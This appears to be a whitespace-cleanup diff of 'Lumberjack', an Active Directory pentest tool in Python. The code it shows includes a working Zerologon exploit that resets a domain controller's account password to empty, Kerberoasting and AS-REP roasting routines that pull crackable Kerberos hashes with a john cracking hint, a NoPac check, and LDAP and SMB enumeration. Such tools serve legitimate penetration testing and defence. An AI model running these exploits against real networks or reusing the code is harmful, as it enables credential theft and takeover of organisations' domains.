@@ -9,8 +9,8 @@ try:
 	from datetime import datetime, timedelta
 	from dominate.tags import *
 	from getpass import getpass
-	from ldap3 import SUBTREE, ALL_ATTRIBUTES 
-	from ldap3.core.exceptions import LDAPBindError, LDAPException	
+	from ldap3 import SUBTREE, ALL_ATTRIBUTES
+	from ldap3.core.exceptions import LDAPBindError, LDAPException
 	from netaddr import *
 	from pprint import pprint
 	from pyasn1.codec.der import decoder, encoder
@@ -31,13 +31,13 @@ try:
 	from impacket.krb5 import constants
 	from impacket.krb5.kerberosv5 import getKerberosTGT
 	from impacket.krb5.asn1 import TGS_REP
-	from impacket.nmb import NetBIOSTimeout, NetBIOSError	
+	from impacket.nmb import NetBIOSTimeout, NetBIOSError
 	from impacket.dcerpc.v5 import transport
 	from impacket import smbconnection
 	from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
 	from impacket.krb5.kerberosv5 import sendReceive, KerberosError
 	from impacket.krb5.types import KerberosTime, Principal
-	
+
 except Exception as e:
     	print ("Error {}\n".format(e))
 
@@ -55,9 +55,9 @@ MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
 
 #Connection Class
 class Connect (object):
-	
+
 	def __init__(self, domain, username, password, dc_ip, status):
-	
+
 		self.status = status
 		self.status.update(status="[bold white]Connecting to Active Directory...\n")
 		sleep(1)
@@ -66,17 +66,17 @@ class Connect (object):
 		self.password = password
 		self.dc_ip = dc_ip
 		self.server, self.conn = Connect.connect(self, self.dc_ip)
-		
+
 	#Connect to domain
 	def connect(self, dc_ip):
-	
+
 		if dc_ip is not None:
 			self.target = self.dc_ip
 		else:
 			self.target = self.domain
-	
+
 		self.user = '%s\\%s' % (self.domain, self.username)
-		
+
 		try:
 			self.server = ldap3.Server(self.target, get_info=ldap3.ALL, port=636, use_ssl=True)
 			self.conn = ldap3.Connection(self.server, user=self.user, password=self.password, authentication=ldap3.NTLM, auto_bind=True)
@@ -86,13 +86,13 @@ class Connect (object):
 			console.print ("[-] Error: Failed to connect: {}\n".format(e), style = "error")
 			raise LDAPBindError
 		return self.server, self.conn
-	
-	
+
+
 #Enumeration Class
 class EnumerateAD(object):
 
 	def __init__(self, server, conn, kerberoast, smb, fuzz, domain, username, password, dc_ip, status, large, asrep, vulns, root=None):
-		
+
 		self.asrep = asrep
 		self.large = large
 		self.status = status
@@ -106,11 +106,11 @@ class EnumerateAD(object):
 		self.server = server
 		self.conn = conn
 		self.vulns = vulns
-		
+
 		#lists
 		self.computers = []
 		self.compWrite = []
-		self.spn = []   
+		self.spn = []
 		self.spnWrite = []
 		self.users = []
 		self.userWrite = []
@@ -124,15 +124,15 @@ class EnumerateAD(object):
             		self.root = self.getRoot()
 		else:
 			self.root = root
-	
+
 	def getRoot(self):
         	return self.server.info.other['defaultNamingContext'][0]
-        	
-	#Enumerate Active Directory Users		
+
+	#Enumerate Active Directory Users
 	def enumerateUsers(self):
-	
-		try:		
-			userObj = []	
+
+		try:
+			userObj = []
 			self.status.update("[bold white]Finding Active Directory Users...\n")
 			sleep(1)
 			console.rule("[bold red]Domain Users")
@@ -142,16 +142,16 @@ class EnumerateAD(object):
 				self.total_entries = 0
 				self.entry_generator = self.conn.extend.standard.paged_search('%s' % (self.root),
 							search_filter='(objectCategory=person)',
-							attributes=['sAMAccountName'], 
+							attributes=['sAMAccountName'],
 							size_limit=0)
 				for entry in self.entry_generator:
 					pprint(entry)
 					self.userWrite.append(self.conn.entries)
 				console.print ("[+] Success: Got all domain users\n", style = "success")
-			#Search AD Users 
+			#Search AD Users
 			else:
 				self.conn.search('%s' % (self.root), search_filter='(objectCategory=person)',
-						 attributes=['sAMAccountName'], 
+						 attributes=['sAMAccountName'],
 						 size_limit=0)
 				for entry in self.conn.entries:
 					name = entry["sAMAccountName"][0]
@@ -174,13 +174,13 @@ class EnumerateAD(object):
 			self.conn.unbind()
 			console.print ("[-] Warning: Aborted\n", style = "warning")
 			sys.exit(1)
-		
 
-	#Enumerate Active Directory Computers		
+
+	#Enumerate Active Directory Computers
 	def enumComputers(self):
 
-		try:		
-			computerObjects = []		
+		try:
+			computerObjects = []
 			self.status.update("[bold white]Finding Active Directory Computers...\n")
 			sleep(1)
 			console.rule("[bold red]Domain Computers")
@@ -210,15 +210,15 @@ class EnumerateAD(object):
 				except KeyboardInterrupt:
 					self.conn.unbind()
 					console.print ("[-] Warning: Aborted\n", style = "warning")
-					sys.exit(1)	
+					sys.exit(1)
 		except LDAPException as e:
 			console.print ("[-] Warning: No Computers Found\n", style = "warning")
 			pprint ("Error {}\n".format(e))
 			sys.exit(1)
-		
-	#Enumerate Active Directory Groups			
+
+	#Enumerate Active Directory Groups
 	def enumerateGroups(self):
-		
+
 		try:
 			groupobj = []
 			self.status.update("[bold white]Finding Active Directory Groups...\n")
@@ -251,7 +251,7 @@ class EnumerateAD(object):
 
 	#Enumerate Organisational Units
 	def enumerateOUs(self):
-		
+
 		try:
 			ouObj = []
 			self.status.update("[bold white]Finding Organisational Units...\n")
@@ -281,10 +281,10 @@ class EnumerateAD(object):
 			self.conn.unbind()
 			console.print ("[-] Warning: Aborted\n", style = "warning")
 			sys.exit(1)
-			
+
 	#Search for domain admins
 	def search_admins(self):
-	
+
 		try:
 			admin_users = []
 			self.status.update("[bold white]Finding Admin Users...\n")
@@ -294,7 +294,7 @@ class EnumerateAD(object):
 			self.conn.search('%s' % (self.root), '(&(adminCount=1)(objectclass=person))', attributes=['sAMAccountName'], size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["sAMAccountName"][0]
-	
+
 				admin_users.append({
 					print(f'[+] {name} \n'),
 				})
@@ -317,8 +317,8 @@ class EnumerateAD(object):
 			self.conn.unbind()
 			console.print ("[-] Warning: Aborted\n", style = "warning")
 			sys.exit(1)
-			
-	#Get domain policies		
+
+	#Get domain policies
 	def getDomainPolicy(self):
 
 		try:
@@ -332,11 +332,11 @@ class EnumerateAD(object):
 			for entry in self.conn.entries:
 				name = entry["ms-DS-MachineAccountQuota"][0]
 				MachineAccountQuota = int(str(entry['ms-DS-MachineAccountQuota']))
-				
+
 				domainpolicies.append({
 					print(f'[+] The number of computer accounts that a user is allowed to create in a domain = {name} \n'),
 				})
-			
+
 			if MachineAccountQuota < 0:
         			console.print("[-] Not vulnerable, cannot proceed with Machine creation\n")
 			else:
@@ -357,11 +357,11 @@ class EnumerateAD(object):
 			self.conn.unbind()
 			console.print ("[-] Warning: Aborted\n", style = "warning")
 			sys.exit(1)
-			
-	#Enumerate accounts trusted for delegation (unconstrained delegation)					
+
+	#Enumerate accounts trusted for delegation (unconstrained delegation)
 	def unconstrainedDelegation(self):
-	
-		try:	
+
+		try:
 			unconstrained = []
 			self.status.update("[bold white]Finding Users with Unconstrained Delegation...\n")
 			sleep(1)
@@ -379,10 +379,10 @@ class EnumerateAD(object):
 				console.print ("[!] Vulnerability: Domain Vulnerable to Unconstrained Delegation\n", style = "error")
 				self.vulns +=1
 			console.print('[-] Found {0} account(s) with Unconstrained Delegation\n'.format(len(self.conn.entries)), style = "info")
-		except LDAPException as e:   
+		except LDAPException as e:
 			console.print ("[-] Warning: No Affected Users Found\n", style = "warning")
 			pprint ("[-] Error: {}\n".format(e))
-			sys.exit(1)  
+			sys.exit(1)
 		try:
 			self.status.update("[bold white]Waiting...\n")
 			console.print ("[-] Enumerate SPNs?\n", style = "status")
@@ -391,12 +391,12 @@ class EnumerateAD(object):
 		except KeyboardInterrupt:
 			self.conn.unbind()
 			console.print ("[-] Warning: Aborted\n", style = "warning")
-			sys.exit(1)	
-						
+			sys.exit(1)
+
 	#Enumerate SPNs
 	def enumSPNs(self):
-	
-		try:	
+
+		try:
 			spnslist = []
 			self.status.update("[bold white]Enumerating SPNs...")
 			sleep(1)
@@ -412,7 +412,7 @@ class EnumerateAD(object):
 				})
 				self.spn.append(entry)
 				self.spnWrite.append(name)
-				
+
 			console.print ("[+] Success: Got all SPNs\n", style = "success")
 			if len(self.conn.entries) >= 1:
 				console.print ("[!] Vulnerability: Target might be vulnerable to Kerberoasting\n", style = "error")
@@ -420,13 +420,13 @@ class EnumerateAD(object):
 			console.print('[-] Found {0} SPN Account(s)\n'.format(len(self.conn.entries)), style = "info")
 			if self.kerberoast:
 				ExploitAD.kerberoast(self.dc_ip, self.spn, self.username, self.password, self.domain, self.status)
-			else:	
+			else:
 				pass
-			
-		except LDAPException as e:   
+
+		except LDAPException as e:
 			console.print ("[-] Warning: No Affected Users Found\n", style = "warning")
 			pprint ("[-] Error: {}\n".format(e))
-			sys.exit(1)  
+			sys.exit(1)
 		try:
 			self.status.update("[bold white]Waiting...\n")
 			console.print ("[-] Enumerate AS-REP Roastable Users?\n", style = "status")
@@ -436,16 +436,16 @@ class EnumerateAD(object):
 			self.conn.unbind()
 			console.print ("[-] Warning: Aborted\n", style = "warning")
 
-	#Enumerate Users that dont require Keberos Pre-Authentication 
+	#Enumerate Users that dont require Keberos Pre-Authentication
 	def enumKerbPreAuth(self):
-		
+
 		asRepObj = []
 		self.status.update("[bold white]Finding Users that dont require Kerberos Pre-Authentication...\n")
 		sleep(1)
 		# Build user array
 		console.rule("[bold red]AS-REP Roastable Users")
 		print('')
-		self.conn.search('%s' % (self.root), search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
+		self.conn.search('%s' % (self.root), search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
 				attributes=["cn", "objectSid", "sAMAccountName"], search_scope=SUBTREE)
 		for entry in self.conn.entries:
 			name = entry["sAMAccountName"][0]
@@ -460,10 +460,10 @@ class EnumerateAD(object):
 		console.print('[-] Found {0} account(s) that Dont Require Kerberos Pre-Authentication\n'.format(len(self.conn.entries)), style = "info")
 		if self.asrep:
 				ExploitAD.ASREPRoast(self.users, self.domain, self.dc_ip, self.status)
-		
+
 	#Fuzz AD with ANR (Ambiguous Name Resolution)
 	def searchRandom(self, fobject, objectCategory=''):
-	
+
 		self.status.update("[bold white]Fuzzing Active Directory for: '{}'\n".format(fobject))
 		console.rule("[bold red]Random AD Objects")
 		print('')
@@ -472,15 +472,15 @@ class EnumerateAD(object):
 			searchFilter = '(&(objectCategory={})(anr={}))'.format(objectCategory, fobject)
 		else:
 			searchFilter = '(anr={})'.format(fobject)
-		try:	
+		try:
 			self.conn.search('%s' % (self.root), search_filter=searchFilter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
 			console.print('[-] Found {0} Objects'.format(len(self.conn.entries)), style = "info")
-			pprint(self.conn.entries) 
-		except LDAPException as e:   
+			pprint(self.conn.entries)
+		except LDAPException as e:
 			console.print ("[-] Warning Nothing found\n", style = "warning")
 			pprint ("[-] Error: {}\n".format(e))
-			sys.exit(1)  
-			
+			sys.exit(1)
+
 	def sortComputers(self):
 
 		for computer in self.computers:
@@ -496,7 +496,7 @@ class EnumerateAD(object):
 
 	def enumSMB(self):
 
-		self.status.update("[bold white]Enumerating SMB...\n")		
+		self.status.update("[bold white]Enumerating SMB...\n")
 		try:
 			console.rule("[bold red]Enumerating SMB")
 			print('')
@@ -527,10 +527,10 @@ class EnumerateAD(object):
 					availDirs.append(key)
 
 		if len(self.smbShareCandidates) == 1:
-			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}\n".format(len(self.smbShareCandidates), 
+			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}\n".format(len(self.smbShareCandidates),
 						len(self.smbBrowseable.keys()), len(availDirs), self.username), style = "info")
 		else:
-			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}\n".format(len(self.smbShareCandidates), 
+			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}\n".format(len(self.smbShareCandidates),
 						len(self.smbBrowseable.keys()), len(availDirs), self.username), style = "warning")
 		if len(self.smbBrowseable.keys()) > 0:
 			with open('{0}-open-smb.json'.format(self.domain), 'w') as f:
@@ -551,11 +551,9 @@ class ExploitAD(object):
 	"""
 	Check if domain controller is vulnerable to the Zerologon attack aka CVE-2020-1472.
 	Resets the DC account password to an empty string when vulnerable.
-	
-	Secura
 	"""
 	def try_zero_authenticate(dc_handle, dc_ip, target_computer):
-	
+
 		# Connect to the DC's Netlogon service.
 		binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
 		rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
@@ -590,7 +588,7 @@ class ExploitAD(object):
 			console.print ("[-] Error {}\n".format(ex), style = "error")
 
 	def try_zerologon(dc_handle, rpc_con, target_computer):
-		
+
 		request = nrpc.NetrServerPasswordSet2()
 		request["PrimaryName"] = dc_handle + "\x00"
 		request["AccountName"] = target_computer + "$\x00"
@@ -605,7 +603,7 @@ class ExploitAD(object):
 
 	#main function for Zerologon
 	def perform_attack(dc_handle, dc_ip, target_computer):
-	
+
 		console.rule("[bold red]Zerologon Vulnerability")
 		print('')
 
@@ -630,7 +628,7 @@ class ExploitAD(object):
 				status.update("[bold white]Exploiting Zerologon vulnerability...\n")
 				result = ExploitAD.try_zerologon(dc_handle, rpc_con, target_computer)
 				if result["ErrorCode"] == 0:
-	
+
 					console.print("[+] Success: Exploit completed! Domain Controller's account password has been set to an empty string\n", style = "success")
 				else:
 					console.print("[-] Warning: Non-zero return code, something went wrong. Domain Controller returned: {}\n".format(result["ErrorCode"]), style = "warning")
@@ -643,7 +641,7 @@ class ExploitAD(object):
 
 	#Test for CVE-2021-42287(NoPac)
 	def TGT_size(credentials, dc_ip, status):
-		
+
 		status.update(status="[bold white]Testing for No_Pac vulnerability...\n")
 		sleep(1)
 		console.rule("[bold red]CVE-2021-42287")
@@ -669,10 +667,9 @@ class ExploitAD(object):
 			console.print("[!] Vulnerability: Possibly vulnerable to CVE-2021-42287. \n\n[+] Apply Patches", style = 'error')
 			self.vulns +=1
 
-				
-	#Kerberoasting: From GetUserSPNs.py			
+	#Kerberoasting: From GetUserSPNs.py
 	def kerberoast(dc_ip, spn, username, password, domain, status):
-		
+
 		status.update(status="[bold white]Kerberoasting SPN Accounts...\n")
 		sleep(1)
 		console.rule("[bold red]Kerberoasting")
@@ -683,8 +680,8 @@ class ExploitAD(object):
 		idx = 0
 		for entry in spn:
 			spnJson = json.loads(spn[idx].entry_to_json())
-			users_spn[ExploitAD.splitJsonArr(spnJson['attributes'].get('name'))] = ExploitAD.splitJsonArr(spnJson['attributes'].get('servicePrincipalName')) 
-			idx += 1    
+			users_spn[ExploitAD.splitJsonArr(spnJson['attributes'].get('name'))] = ExploitAD.splitJsonArr(spnJson['attributes'].get('servicePrincipalName'))
+			idx += 1
 
 		# Get TGT for the supplied user
 		client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -726,8 +723,8 @@ class ExploitAD(object):
 							hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
 							user_tickets[spn1] = entry
 						elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
-							entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], 
-							spn1.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), 
+							entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'],
+							spn1.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
 							hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
 							user_tickets[spn1] = entry
 
@@ -742,7 +739,7 @@ class ExploitAD(object):
 					console.print('[+] Success: Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets\n'.format(len(user_tickets.keys()), domain), style = 'success')	
 			else:
 				console.print('[-] Received {0} ticket(s) for Kerberoasting\n'.format(len(user_tickets.keys())), style = 'warning')
-			
+
 			sys.exit(0)
 
 		except KerberosError as err:
@@ -813,7 +810,7 @@ class ExploitAD(object):
 
 			asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
 
-			hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, Domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), 
+			hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, Domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
 							hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
 
 		if len(hashes) > 0:
@@ -827,12 +824,11 @@ class ExploitAD(object):
 		else:
 			console.print('[-] Got 0 hashes\n', style = 'info')
 
-		
 #function for lumberjack title art
 def titleArt():
 	f = Figlet(font="slant")
 	cprint(colored(f.renderText('Lumberjack'), 'cyan'))
-	
+
 #impacket utils.py
 def parse_credentials(credentials):
 
@@ -856,7 +852,7 @@ def report(filename, usr, cmp, g, o, a, spn, ud, asrep):
 
 	doc = dominate.document(title='Lumberjack report')
 
-	with doc.head: 
+	with doc.head:
 		link(rel='stylesheet', href='style.css')
 
 	with doc:
@@ -942,9 +938,9 @@ def report(filename, usr, cmp, g, o, a, spn, ud, asrep):
 					for i in asrep:
 						with tr():
 							td(i)
-		
+
 	console.print("[-] Generating report called {}.html".format(filename), style = 'status')
-	
+
 	with open('{}.html'.format(filename), 'w') as f:
 		for d in doc:
 				f.write(str(d) + '\n')
@@ -959,10 +955,10 @@ def main():
 		      / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
 		     /_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
 							/___/
-	                       __.                                   
+	                       __.
 	              ________/o |)
 	             {_______{_rs|
-	        
+
        A Prototype Active Directory Vulnerability Identification, Exploitation, & Reporting Tool
     |*------------------------------------------------------------------------------------------*|
    	 '''))
@@ -979,43 +975,43 @@ def main():
 	parser.add_argument('-asrep', help='AS-REP Roasting', action='store_true')
 	parser.add_argument('-smb', '--smb', help='enumerate SMB shares', action='store_true')
 	parser.add_argument('-f', '--fuzz', type=str)
-	parser.add_argument('--report', type=str, help='Create HTML Report') 
+	parser.add_argument('--report', type=str, help='Create HTML Report')
 	args = parser.parse_args()
-	
+
 	#split credentials into their three components: name of DC, username, and the password
 	domain, username, password = parse_credentials(args.credentials)
 	dc_ip = args.ip_address
-	
+
 	#vulnerability counter
 	vulns = 0
-	
+
 	#Display help page if no arguments are provided
 	if len(sys.argv) < 2:
 		console.print("[-] Warning: No Arguments Provided\n", style = "warning")
 		parser.print_help()
 		parser.exit(1)
-	
+
 	if domain is None:
 		domain = ''
 
 	if password == '' and username != '':
 		status.update("[bold white]Enter a Password:\n")
 		password = getpass("")
-	
+
 	if args.fuzz:
 		args.enumerate = False
 		args.exploit = False
 	elif args.enumerate:
 		args.exploit = False
-	
-	if not args.exploit != 1:		
+
+	if not args.exploit != 1:
 		#Regex for invalid domain name or invalid ip address format or no password
 		domainRE = re.compile(r'^(([a-zA-Z]{1})|([a-zA-Z]{1}[a-zA-Z]{1})|([a-zA-Z]{1}[0-9]{1})|([0-9]{1}[a-zA-Z]{1})|([a-zA-Z0-9][-_\.a-zA-Z0-9]{1,61}[a-zA-Z0-9]))\.([a-zA-Z]{2,13}|[a-zA-Z0-9-]{2,30}\.[a-zA-Z]{2,3})$')
 		domainMatch = domainRE.findall(domain)
 
 		ipRE = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
 		ipaddr = ipRE.findall(dc_ip)
-		
+
 		#if invalid domain name and ip address format
 		if not ipaddr:
 			console.print("[-] Error: {} is not a valid IP Address'\n".format(dc_ip), style = "error")
@@ -1023,14 +1019,14 @@ def main():
 		if not domainMatch:
 			console.print("[-] Error: {} is not a valid domain name'\n".format(domain), style = "error")
 			sys.exit(1)
-	
+
 	#password strength regex
 	pswdreg = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!#%*?&]{8,18}$"
 	match_re = re.compile(pswdreg)
 	pwdres = re.search(match_re, password)
-	
+
 	console.print("[-] Warning: Do not run this script in a production enviroment!\n", style="warning")
-	
+
 	titleArt()
 
 	console.print("[+] Success: Lumberjack Started\n", style="success")
@@ -1039,10 +1035,10 @@ def main():
 	if not pwdres:
 		console.print("[!] Vulnerability: Active Directory has a weak password policy\n", style = "error")
 		vulns += 1
-	
-	#The clock is running!	
+
+	#The clock is running!
 	start_time = datetime.now()
-	
+
 	if args.exploit == '1':
 		dc_name = args.netbios.rstrip("$")
 		ExploitAD.perform_attack("\\\\" + dc_name, dc_ip, dc_name)
@@ -1054,12 +1050,12 @@ def main():
 	#server and connection to AD
 	s = connectAD.server
 	c = connectAD.conn
-	
+
 	if args.exploit == '2':
 		args.enumerate = False
 		args.fuzz = False
 		ExploitAD.TGT_size(args.credentials, dc_ip, status)
-	
+
 	#Run main features
 	try:
 		enumAD = EnumerateAD(s, c, args.kerberoast, args.smb, args.fuzz, domain, username, password, dc_ip, status, args.large, args.asrep, vulns)
@@ -1070,35 +1066,35 @@ def main():
 			enumAD.enumerateUsers()
 		elif args.fuzz is not False:
 			enumAD.searchRandom(args.fuzz)
-	
+
 	except KeyboardInterrupt:
 		console.print ("[-] Warning: Aborting\n", style = "warning")
-			
+
 	console.rule("[bold red]")
 	print('')
 	print('')
-	
+
 	#generate HTML report
 	usr, cmp, g, o, a, spn, ud, asrep, vulnsCount = enumAD.userWrite, enumAD.compWrite, enumAD.groupWrite, enumAD.ouWrite, enumAD.adminWrite, enumAD.spnWrite, enumAD.uncontrainedWrite, enumAD.asrepWrite, enumAD.vulns
 	if args.report:
 		report(args.report, usr, cmp, g, o, a, spn, ud, asrep)
-	
+
 	console.print ("[!] Warning: {0} vulnerabilities found in {1}\n".format(vulnsCount, domain), style = 'error')
-		
+
 	#Exit Lumberjack
 	status.update("[bold white]Exiting Lumberjack...\n")
 	sleep(1)
 	#Stop the clock
 	elapsed = datetime.now() - start_time
 	console.print(f"[-] Completed after {elapsed.total_seconds():.2f} seconds\n", style="warning")
-	
+
 if __name__ == "__main__":
 	print('')
 	with console.status("[bold white]Starting Lumberjack...\n") as status:
 		try:
 			sleep(1)
 			main()
-			console.print("[+] Success: Finished\n", style="success")	
+			console.print("[+] Success: Finished\n", style="success")
 		except KeyboardInterrupt:
 			console.print ("[-] Warning: Aborted\n", style= "warning")
 	print('')
